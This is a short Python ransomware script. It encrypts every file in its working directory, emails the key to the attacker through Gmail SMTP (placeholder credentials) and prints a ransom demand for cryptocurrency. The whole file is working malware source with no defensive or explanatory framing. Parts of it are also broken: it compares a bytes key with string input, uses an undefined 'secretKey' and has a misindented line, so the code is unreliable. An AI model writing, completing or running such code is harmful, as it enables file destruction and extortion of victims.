#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
from pyfiglet import figlet_format
from termcolor import colored
import smtplib

print(colored(figlet_format("I OWN YOUR FILES", font="pagga"), color="red"))


# SCANNING FOR FILES AND ENCRYPTING THEM
files = []
for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()


for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

# FUNCTION THAT SENDS THE EMAILS
def mailme(email, password,  message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# SENDING THE GENERATED KEY TO ATTACKER'S EMAIL
mailme("attackers email goes here", "email password", key)

print("SEND 1 MILLION SHIBAINU TO '0xefhjfjfkejfhejkfce' OR LOSE YOUR FILES!!")
print("IMMA SEND YOU THE DECRYPT KEY ONCE I RECEIVE THE CRYPTO\nENTER DECRYPT KEY:")
victim_email = input("ENTER YOUR EMAIL ADDRESS TO RECEIVE THE DECRYPT KEY: ")
mailme("attackers email goes here", "email password", victim_email)


# DECRYPTION CODE
while True:
    decKey = input("PASTE THE DECRYPTION KEY HERE: ")
    if decKey == key:
        for file in files:
            with open(file, "rb") as thefile:
                content = thefile.read()
            content_decrypted = Fernet(secretKey).decrypt(content)
            with open(file, "wb") as thefile:
                thefile.write(content_decrypted)
         print(colored(figlet_format("YOUR FILES ARE DECRYPTED!!", font="pagga"), color="red"))
        break
    else:
        print("WRONG KEY!!")
